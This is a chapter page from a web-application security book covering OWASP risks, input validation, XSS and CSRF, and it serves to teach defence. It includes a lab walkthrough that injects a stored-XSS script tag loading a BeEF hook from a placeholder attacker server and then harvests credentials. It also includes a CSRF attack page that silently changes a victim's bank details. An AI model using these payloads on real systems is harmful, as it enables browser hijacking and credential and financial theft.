<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>10. Web Applications</title>
  <link href="stylesheet.css" type="text/css" rel="stylesheet" />
  <link href="external/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
  <link rel="icon" href="images/favicon-128.png" sizes="128x128">
  <link rel="icon" href="images/favicon-32.png" sizes="32x32">
  <link rel="icon" href="images/favicon-16.png" sizes="16x16">
  <!-- Global Site Tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106756952-3"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments)};
    gtag('js', new Date());

    gtag('config', 'UA-106756952-3');
  </script>
</head>
<body dir="ltr" class="kramdown">
  <div id="top-bar">
    <div id="top-bar-content">
        <b>10. Web Applications</b><br>
        <a href="toc.html">Table of contents</a><br>
        Please support this book:
        <a href="https://leanpub.com/holistic-infosec-for-web-developers-fascicle1-vps-network-cloud-webapplications">buy it (PDF, EPUB, MOBI)</a>       
    </div>
  </div>
<div id="page-content" class="kramdown">
<h2 id="web-applications">10. Web Applications</h2>


<img src="images/10000WebApp.png" alt="10,000' view and lower of Web Application Security"/>
<figcaption>10,000’ view and lower of Web Application Security</figcaption>


<h3 id="leanpub-auto-ssm-asset-identification-2">1. SSM Asset Identification</h3>
<p>Take the results from the higher level Asset Identification in the 30,000’ View chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Remove any that are not applicable, add any relevant from previous chapters, add any newly discovered. Here are some to get you started:</p>

<ul id="web-applications-asset-identification-ownership">
  <li>Ownership. Similarly as addressed in the VPS chapter, Do not assume that ownership, or at least control of your server(s) is something you will always have. Ownership is often one of the first assets an attacker will attempt to take from a target in order to execute further exploits. At first this may sound strange, but that is because of an assumption you may have that you will always own (have control of) your web application. Hopefully I dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets of greater value. The web application itself will often just be a stepping stone to other assets that you assume are safe. With this in mind, your web application is an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect your web application and in many cases take it to school and teach it how to protect itself. I cover that under the <a href="chap06.html#web-applications-countermeasures-insufficient-attack-protection">Insufficient Attack Protection</a> section</li>
  <li>Similarly to the <a href="chap03.html#vps-asset-identification">Asset Identification</a> section in the VPS chapter, Visibility is an asset that is up for grabs</li>
  <li>Intellectual property or sensitive information within the code or configuration files such as email addresses and account credentials for the likes of data-stores, syslog servers, monitoring services. We address this in <a href="chap06.html#web-applications-identify-risks-management-of-application-secrets">Management of Application Secrets</a>
</li>
  <li>Sensitive Client/Customer data.</li>
  <li>Sanity and peace of mind of people within your organisation. Those that are:
    <ul>
      <li>Well informed</li>
      <li>Do not cut corners that should not be cut</li>
      <li>Passionate and driven to be their best</li>
      <li>Smart</li>
      <li>Humble yet fearless</li>
      <li>Recognise technical debt and are professional enough to speak up</li>
      <li>Engaged and love passing on their knowledge to others are truly an asset.<br />
Some of the following risks will threaten the sanity of these people if the countermeasures are not employed.</li>
    </ul>
  </li>
</ul>

<h3 id="leanpub-auto-ssm-identify-risks-2">2. SSM Identify Risks</h3>
<p>Go through the same process as we did at the top level, in the 30,000’ View chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>, but for Web Applications. Also <a href="https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008">MS Application Threats and Countermeasures</a> is useful.</p>

<p>The following is the OWASP Top 10 vulnerabilities for 2003, 2004, 2007, 2010, 2013 and 2017.</p>


<img src="images/OWASPTop10OverTime.png" alt="OWASP Top 10 Over Time"/>


<p>As you can see there are some vulnerabilities that we are just not getting better at removing. I’ve listed them in order of most consistent to not quite as consistent:</p>

<ol class="numeric">
  <li>Injection (and the easiest to fix)</li>
  <li>Broken Authentication and Session Management</li>
  <li>XSS</li>
  <li>Insecure Direct Object References</li>
  <li>Missing Function Level Access Control</li>
  <li>We have gotten a little better at reducing CSRF with using the likes of the synchroniser token pattern, and possibly using LocalStorage more than cookies</li>
</ol>

<p>“Using Components with Known Vulnerabilities” is one that I think we are going to see get worse before it gets better, due to the fact that we are consuming a far greater amount of free and open source. With the increase of free and open source package repositories, such as NPM, NuGet and various others, we are now consuming a far greater number of packages without vetting them before including them in our projects. This is why I’ve devoted a set of sections (“Consuming Free and Open Source”) within this chapter to this problem. There are also sections devoted to this topic in the VPS and Network chapters titled “Using Components with Known Vulnerabilities”. It’s not just a problem with software. We are trying to achieve more, with less of our own work, so in many cases we are blindly trusting other sources. From the attackers perspective, this is an excellent vector to compromise for maximum exploitation.</p>

<h4 id="leanpub-auto-lack-of-visibility-6">Lack of Visibility</h4>

<p>I see this as an indirect risk to the asset of <a href="chap06.html#web-applications-asset-identification-ownership">web application ownership</a>. The same sections in the VPS and Network chapters may also be worth reading if you have not already, as there is some crossover.</p>

<p>Not being able to introspect your application at any given time or being able to know how the health status is, is not a comfortable place to be in and there is no reason you should be there.</p>

<h5 id="leanpub-auto-insufficient-logging-and-monitoring">Insufficient Logging and Monitoring</h5>


<img class="threat-tags" src="images/ThreatTags----average-widespread-veryeasy-moderate.png"/>


<p>Can you tell at any point in time if someone or something is:</p>

<ul>
  <li>Using your application in a way that it was not intended to be used</li>
  <li>Violating policy. For example circumventing client side input sanitisation.</li>
</ul>

<p>How easy is it for you to notice:</p>

<ul>
  <li>Poor performance and potential DoS?</li>
  <li>Abnormal application behaviour or unexpected logic threads</li>
  <li>Logic edge cases and blind spots that stake holders, Product Owners and Developers have missed?</li>
  <li>Any statistics that may be helpful in diagnosing any application specific issue</li>
</ul>

<h4 id="web-applications-identify-risks-lack-of-input-validation-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</h4>

<img class="threat-tags" src="images/ThreatTags----average-verywidespread-average-moderage.png"/>


<h5 id="leanpub-auto-generic">Generic</h5>

<p>The risks here are around accepting untrusted data and parsing it, rendering it, executing it or storing it verbatim to have the same performed on it at a later stage. </p>

<p>Untrusted territory is usually a location that is not close to your back-end executing code. If your back-end is in the cloud that you do not control, I.E. not your hardware, not your staff running it, then you have serious potential issues there as well that you may want to address. I’ve discussed in depth what these issues are in the previous chapters and how to mitigate the risks. Anywhere outside of your local network is untrusted. Inside your local network is semi-trusted. The amount of trust you afford depends on the relationships you have with your staff, how large your staff base is, how large your network is, how APs are managed and many of the other issues I have discussed in the previous chapters, especially Network, and Physical and People from <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle0</a>. The closer data gets to the executing back-end code, the less untrustworthy the territory should be. Of course there are many exceptions to this rule as well.</p>

<p>So I could say, just do not trust anyone or anything, but there comes a time and a place that you have to afford trust. Just keep it as close to the back-end executing code as possible.</p>

<p>If you parse, render or execute data that you can not trust, that is data accepted by an unknown user, whether it be through a browser, intercepting communications somewhere along untrusted territory.</p>

<p>The web stack today is very complicated. We have URLs, CSS, JavaScript, XML and its derivatives, templating languages and frameworks. Most of these languages have their own encoding, quoting, commenting, escaping, and most of which can be nested inside of each other. Making the web browser a very treacherous place in terms of security. Browsers have made their living out of being insanely convoluted at interpreting all of this. All scripts have the same level of privilege within the browser.</p>

<p>This overly complex environment leads to confusion and a perfect haven for hiding malicious code chunks.</p>

<p>Below are a few techniques widely accepted that we need to use on any untrusted data before it makes its travels through your system to be stored or hydrated.</p>

<h6 id="web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation">What is Validation</h6>

<p> </p>

<p>Decide what input is valid by way of a white list (list of input characters that are allowed to be received). Often each input field will have a different white list. Validation is binary, the data is either allowed to be received or not allowed. If it is not allowed, then it is rejected. This is usually not to complicated to work out what is good, what is not and thus rejected. There are a few strategies to use for white listing, such as the actual collection of characters or using regular expressions.</p>

<p>There are other criteria that you can validate against as well, such as:</p>

<ul>
  <li>Field lengths</li>
  <li>Whether or not something is required</li>
  <li>Whether or not something is a specific type or in a specific format and many other criteria</li>
</ul>

<figure class="code">
  <figcaption>Validation</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// The NodeJS module express-form provides validation, filtering</code>
<code class="c1">// and some light weight sanitisation as Express middleware.</code>
<code class="kd">var</code> <code class="nx">form</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'express-form'</code><code class="p">);</code>
<code class="kd">var</code> <code class="nx">fieldToValidate</code> <code class="o">=</code> <code class="nx">form</code><code class="p">.</code><code class="nx">field</code><code class="p">;</code>

<code class="c1">// trim is filtering.</code>
<code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'name'</code><code class="p">).</code><code class="nx">trim</code><code class="p">().</code>
<code class="c1">// required is validation.</code>
<code class="nx">required</code><code class="p">().</code>
<code class="c1">// minLength is validation.</code>
<code class="nx">minLength</code><code class="p">(</code><code class="mi">2</code><code class="p">).</code>
<code class="c1">// maxLength is validation.</code>
<code class="nx">maxLength</code><code class="p">(</code><code class="mi">50</code><code class="p">).</code>
<code class="c1">// is is validation.</code>
<code class="nx">is</code><code class="p">(</code><code class="sr">/^[a-zA-Z ']+$/</code><code class="p">)</code>
<code class="c1">// There is no sanitisation here.</code>
</pre></div>

</figure>

<h6 id="web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering">What is Filtering</h6>

<p> </p>

<p>When some data can pass through (be received) and some is captured by the filter element (thou shalt not pass). OWASP has the RSnake donated seminal <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS cheat sheet</a> which has many tests you can use to check your vulnerability stance to XSS exploitation. This is highly recommended.</p>

<h6 id="web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">What is Sanitisation</h6>

<p> </p>

<p>Sanitisation of input data is where the input data whether it is in your white list or not is accepted and transformed into a medium that is no longer dangerous. Now it will probably go through validation first. The reason you sanitise character signatures (may be more than single characters, character combinations) not in your white list is a defence in depth strategy. The white list may change in the future due to a change in business requirements and the developer may forget to revise the sanitisation routines. Always think of any security measure as standing on its own when you create it, but standing alongside many other security measures once done.</p>

<p>You need to know which contexts your input data will pass through in order to sanitise correctly for all potential execution contexts. This requires lateral thinking and following all execution paths. Both into and out of your application (once rehydrated), being pushed back to the client. We cover this in depth below in the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp">“Example in JavaScript and C#”</a> section in the countermeasures.</p>

<h5 id="web-applications-identify-risks-cross-site-scripting">Cross-Site Scripting (XSS)</h5>

<p>The following hands on hack demonstrates what a XSS attack is and provides a little insight into some of the damages that it can cause.</p>

<p>A XSS attack is one in which untrusted data enters a web application usually through a web request and is not stopped by validation, filtering or sanitisation. The data is then at some point sent to someone using the same web application without being validated, filtered or sanitised.<br />
The data in question is executed by the browser, usually JavaScript, HTML or Flash. What the code does is up to the creativity of the initiator.</p>

<p>One way this can be carried out trivially is to simply buy an add and have that injected into the end users browser. The malicious code can be easily hidden by simply changing additional scripts that are fetched once live. Even fetching a script that fetches a different script under the attackers control.</p>

<p>The main two different types of XSS are Stored/Persistent or Type I and Reflected/Non-Persistent or Type II.<br />
Stored attacks are where the injected code is sent to the server and stored in a medium that the web application uses to retrieve it again to send to another user.<br />
Reflected attacks use the web application in question as a proxy. When a user makes a request, the injected code travels from another medium through the web application (hence the reflecting) and to the end user. From the browsers perspective, the injected code came form the web application that the user made a request to.</p>


<img src="images/HandsOnHack.png" alt="Hands On Hack"/>


<p>The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in the “Spear Phishing” section of the People chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<p>Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it is likely you would have been through the following:</p>

<ol class="numeric">
  <li>Information gathering (probably partly even before you signed the contract with your client)</li>
  <li>Vulnerability scanning</li>
  <li>Vulnerability searching</li>
</ol>

<p>If you are working within a development team you may have found out some other way that your project was vulnerable to XSS.</p>

<p>How ever you got to this point, you are going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.<br />
One of BeEFs primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network as discussed in the Fortress Mentality section of the Physical chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Exposing XSS faults is one of BeEFs attributes. </p>

<p>You can find the video of how this attack is played out at <a href="http://youtu.be/92AWyUfJDUw">http://youtu.be/92AWyUfJDUw</a>.</p>

<aside>
   <i class="fa fa-2x fa-info-circle sr-icons aside-icon"></i>
   <h3 id="leanpub-auto-synopsis-7">Synopsis</h3>

  <p>In this exercise, I have used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application (<a href="https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project">OWASPBWA</a>) turn-key VM, along with many other useful purposely vulnerable projects.<br />
We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.</p>

</aside>

<aside>
   <i class="fa fa-2x fa-bomb sr-icons aside-icon"></i>
   <h3 id="leanpub-auto-the-play-5">The Play</h3>

  <p>Make sure you have the OWASPBWA <a href="https://code.google.com/p/owaspbwa/wiki/UserGuide">configured</a> and running in your lab.</p>

  <p>From the directory that you have BeEF installed, run the BeEF ruby script: <code>./beef</code></p>

  <p>Log into the BeEF UI at <code>http://localhost:3000/ui/authentication</code> (or using https if you have configured TLS) with the user and password that you set-up in the BeEF root config.yaml.</p>

  <p>Open another browser tab and log-in to the DVWA.</p>

  <p>Browse to “XSS stored”.</p>

  <p>Enter some text in the Name field and some text in the Message field.</p>

  <p>Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on.</p>

  <p>Fire up burp.</p>

  <p>Back in the DVWA send your request by clicking on the Sign Guest-book button.</p>

  <p>Switch back to burp -&gt; Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field <code>mtxMessage</code> with <code>&lt;script src="http://&lt;BeEF comms server IP address&gt;:3000/hook.js"&gt;&lt;/script&gt;</code> and forward the request.</p>

  <p>You can disable FoxyProxy now too.</p>

  <p>Now on your victims machine, the victim can log into DVWA and browse to the same “XSS stored” page. Now as the attacker, you will now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.</p>

  <p>If you open the victims browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.</p>

  <p>Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the <a href="https://github.com/beefproject/beef/wiki/BeEF-modules">BeEF projects wiki</a>.</p>

  <p>If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the “Pretty Theft” node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you have done due diligence in the reconnaissance stage.</p>

    <p>Click on the Execute button and on the next request -&gt; response from the hook.js, the victims browser should pop a “Facebook Session Timed Out” modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or ‘x’ button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  </p>

</aside>

<h4 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf">
  <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern">Cross-Site Request Forgery (CSRF)</a>
</h4>

<img class="threat-tags" src="images/ThreatTags----average-uncommon-easy-moderate.png"/>


<p>This type of attack depends on a fraudulent web resource, be it a website, email, instant message, or program that causes the targets web browser to perform an unintentional action on a website that the target is currently authenticated with.</p>

<p>CSRF attacks target functionality that change state on the server (<code>POST</code>, <code>PUT</code>, <code>DELETE</code>) that the target is currently authenticated with, requests such as changing the targets credentials, making a purchase, moving money at their bank. Forcing the target to retrieve data does not help the attacker.</p>

<p>If you are using cookies (authentication that the browser automatically sends from the client) for storage of client-side session artefacts, CSRF is your main concern, but XSS is also a possible attack vector. </p>

<p>The target needs to submit the request either intentionally or unintentionally. The request could appear to the target as any action. For example:</p>

<ol class="numeric">
  <li>Intentionally by clicking a button on a website that does not appear to have anything in common with the website that the target is already authenticated with by way of session Id stored in a cookie</li>
  <li>Unintentionally by loading a page not appearing to have anything in common with the website that the target is already authenticated with by way of session Id stored in a cookie, that for example contains an <code>&lt;iframe&gt;</code> with a form and a script block inside</li>
</ol>

<p><strong>For No. 1 above</strong>, the action attribute of the form for which the target submits could be to the website that the target is already authenticated with, thus a fraudulent request is issued from a web page seemingly unrelated to the website that the target is already authenticated with. This can be seen in the second example below on line 4. The browser plays its part and sends the session Id stored in the cookie. NodeGoat has an excellent example of how this plays out:</p>

<p>Below code can be found at <a href="https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/views/profile.html">https://github.com/OWASP/NodeGoat/</a>:</p>

<figure class="code" id="profile_html">
  <figcaption>Snippet from legitimate profile.html</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="p">&lt;</code><code class="nt">form</code> <code class="na">role</code><code class="o">=</code><code class="s">"form"</code> <code class="na">method</code><code class="o">=</code><code class="s">"post"</code> <code class="na">action</code><code class="o">=</code><code class="s">"/profile"</code><code class="p">&gt;</code>
<code class="lineno"> 2 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno"> 3 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"firstName"</code><code class="p">&gt;</code>First Name<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno"> 4 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno"> 5 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"text"</code>
<code class="lineno"> 6 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"firstName"</code>
<code class="lineno"> 7 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"firstName"</code>
<code class="lineno"> 8 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{firstName}}"</code>
<code class="lineno"> 9 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter first name"</code><code class="p">&gt;</code>
<code class="lineno">10 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">11 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno">12 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"lastName"</code><code class="p">&gt;</code>Last Name<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno">13 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno">14 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"text"</code>
<code class="lineno">15 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"lastName"</code>
<code class="lineno">16 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"lastName"</code>
<code class="lineno">17 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{lastName}}"</code>
<code class="lineno">18 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter last name"</code><code class="p">&gt;</code>
<code class="lineno">19 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">20 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno">21 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"ssn"</code><code class="p">&gt;</code>SSN<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno">22 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno">23 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"text"</code>
<code class="lineno">24 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"ssn"</code>
<code class="lineno">25 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"ssn"</code>
<code class="lineno">26 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{ssn}}"</code>
<code class="lineno">27 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter SSN"</code><code class="p">&gt;</code>
<code class="lineno">28 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">29 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno">30 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"dob"</code><code class="p">&gt;</code>Date of Birth<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno">31 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno">32 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"date"</code>
<code class="lineno">33 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"dob"</code>
<code class="lineno">34 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"dob"</code>
<code class="lineno">35 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{dob}}"</code>
<code class="lineno">36 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter date of birth"</code><code class="p">&gt;</code>
<code class="lineno">37 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">38 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno">39 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"bankAcc"</code><code class="p">&gt;</code>Bank Account #<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno">40 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno">41 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"text"</code>
<code class="lineno">42 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"bankAcc"</code>
<code class="lineno">43 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"bankAcc"</code>
<code class="lineno">44 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{bankAcc}}"</code>
<code class="lineno">45 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter bank account number"</code><code class="p">&gt;</code>
<code class="lineno">46 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">47 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno">48 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"bankRouting"</code><code class="p">&gt;</code>Bank Routing #<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno">49 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno">50 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"text"</code>
<code class="lineno">51 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"bankRouting"</code>
<code class="lineno">52 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"bankRouting"</code>
<code class="lineno">53 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{bankRouting}}"</code>
<code class="lineno">54 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter bank routing number"</code><code class="p">&gt;</code>
<code class="lineno">55 </code>      <code class="p">&lt;</code><code class="nt">p</code> <code class="na">class</code><code class="o">=</code><code class="s">"help-block"</code><code class="p">&gt;</code>
<code class="lineno">56 </code>         Must be entered as digits with a suffix of #. For example: 0198212# <code class="p">&lt;/</code><code class="nt">p</code><code class="p">&gt;</code>
<code class="lineno">57 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">58 </code>   <code class="p">&lt;</code><code class="nt">div</code> <code class="na">class</code><code class="o">=</code><code class="s">"form-group"</code><code class="p">&gt;</code>
<code class="lineno">59 </code>      <code class="p">&lt;</code><code class="nt">label</code> <code class="na">for</code><code class="o">=</code><code class="s">"address"</code><code class="p">&gt;</code>Address<code class="p">&lt;/</code><code class="nt">label</code><code class="p">&gt;</code>
<code class="lineno">60 </code>      <code class="p">&lt;</code><code class="nt">input</code>
<code class="lineno">61 </code>         <code class="na">type</code><code class="o">=</code><code class="s">"text"</code>
<code class="lineno">62 </code>         <code class="na">id</code><code class="o">=</code><code class="s">"address"</code>
<code class="lineno">63 </code>         <code class="na">name</code><code class="o">=</code><code class="s">"address"</code>
<code class="lineno">64 </code>         <code class="na">value</code><code class="o">=</code><code class="s">"{{address}}"</code>
<code class="lineno">65 </code>         <code class="na">placeholder</code><code class="o">=</code><code class="s">"Enter address"</code><code class="p">&gt;</code>
<code class="lineno">66 </code>   <code class="p">&lt;/</code><code class="nt">div</code><code class="p">&gt;</code>
<code class="lineno">67 </code>   <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"hidden"</code> <code class="na">name</code><code class="o">=</code><code class="s">"_csrf"</code> <code class="na">value</code><code class="o">=</code><code class="s">"{{csrftoken}}"</code> <code class="p">/&gt;</code>
<code class="lineno">68 </code>   <code class="p">&lt;</code><code class="nt">button</code> <code class="na">type</code><code class="o">=</code><code class="s">"submit"</code> <code class="na">class</code><code class="o">=</code><code class="s">"btn btn-default"</code> <code class="na">name</code><code class="o">=</code><code class="s">"submit"</code><code class="p">&gt;</code>Submit<code class="p">&lt;/</code><code class="nt">button</code><code class="p">&gt;</code>
<code class="lineno">69 </code><code class="p">&lt;/</code><code class="nt">form</code><code class="p">&gt;</code>
</pre></div>

</figure>

<p>The below attack code can be found at the NodeGoat <a href="https://nodegoat.herokuapp.com/tutorial/a8">tutorial for CSRF</a>, along with the complete example that ckarande crafted, and an accompanying tutorial video of how the attack plays out:</p>

<figure class="code">
  <figcaption>Snippet from attackers website</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="p">&lt;</code><code class="nt">html</code> <code class="na">lang</code><code class="o">=</code><code class="s">"en"</code><code class="p">&gt;</code>
<code class="lineno"> 2 </code><code class="p">&lt;</code><code class="nt">head</code><code class="p">&gt;&lt;/</code><code class="nt">head</code><code class="p">&gt;</code>
<code class="lineno"> 3 </code>   <code class="p">&lt;</code><code class="nt">body</code><code class="p">&gt;</code>
<code class="lineno"> 4 </code>      <code class="p">&lt;</code><code class="nt">form</code> <code class="na">method</code><code class="o">=</code><code class="s">"POST"</code> <code class="na">action</code><code class="o">=</code><code class="s">"http://TARGET_APP_URL_HERE/profile"</code><code class="p">&gt;</code>
<code class="lineno"> 5 </code>         <code class="p">&lt;</code><code class="nt">h1</code><code class="p">&gt;</code> You are about to win a brand new iPhone!<code class="p">&lt;/</code><code class="nt">h1</code><code class="p">&gt;</code>
<code class="lineno"> 6 </code>         <code class="p">&lt;</code><code class="nt">h2</code><code class="p">&gt;</code> Click on the win button to claim it...<code class="p">&lt;/</code><code class="nt">h2</code><code class="p">&gt;</code>
<code class="lineno"> 7 </code>         <code class="c">&lt;!--User is authenticated, let's force them to change some values--&gt;</code>
<code class="lineno"> 8 </code>         <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"hidden"</code> <code class="na">name</code><code class="o">=</code><code class="s">"bankAcc"</code> <code class="na">value</code><code class="o">=</code><code class="s">"9999999"</code><code class="p">/&gt;</code>
<code class="lineno"> 9 </code>         <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"hidden"</code> <code class="na">name</code><code class="o">=</code><code class="s">"bankRouting"</code> <code class="na">value</code><code class="o">=</code><code class="s">"88888888"</code><code class="p">/&gt;</code>
<code class="lineno">10 </code>                            <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"submit"</code> <code class="na">value</code><code class="o">=</code><code class="s">"Win !!!"</code><code class="p">/&gt;</code>
<code class="lineno">11 </code>      <code class="p">&lt;/</code><code class="nt">form</code><code class="p">&gt;</code>
<code class="lineno">12 </code>   <code class="p">&lt;/</code><code class="nt">body</code><code class="p">&gt;</code>
<code class="lineno">13 </code><code class="p">&lt;/</code><code class="nt">html</code><code class="p">&gt;</code>
</pre></div>

</figure>

<p><strong>For No. 2 above</strong>, is similar to No. 1, but the target does not have to action anything once the fraudulent web page is loaded. The script block submits the form automatically, thus making the request to the website that the target is already authenticated with, the browser again playing its part in sending the session Id stored in the cookie:</p>

<figure class="code">
  <figcaption>Snippet from attackers website</figcaption>

